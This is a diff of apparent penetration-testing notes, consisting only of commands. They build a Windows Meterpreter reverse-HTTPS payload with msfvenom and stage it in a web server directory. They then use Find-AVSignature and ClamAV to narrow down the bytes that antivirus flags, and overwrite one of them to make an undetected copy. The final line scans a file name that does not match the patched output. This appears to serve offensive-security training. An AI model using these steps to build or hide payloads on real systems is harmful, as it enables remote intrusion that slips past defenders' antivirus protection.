@@ -1,7 +1,18 @@
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 
-sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=<> lport=<> -f exe -o /var/www/html/met.exe
+sudo msfvenom -p windows/x64/meterpreter/reverse_https lhost=<> lport=<> -f exe -o /var/www/html/met.exe
 
+cd 'C:\Program Files\ClamAV\'
 Import-Module .\Find-AVSignature.ps1
 Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
 .\clamscan.exe C:\Tools\avtest1
+
+Find-AVSignature -StartByte 10000 -EndByte 20000 -Interval 1000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest2 -Verbose -Force
+.\clamscan.exe C:\Tools\avtest2
+
+$bytes = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
+$bytes[18867] = 0
+[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
+
+Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met1.exe -OutPath C:\Tools\avtest1 -Verbose -Force
+
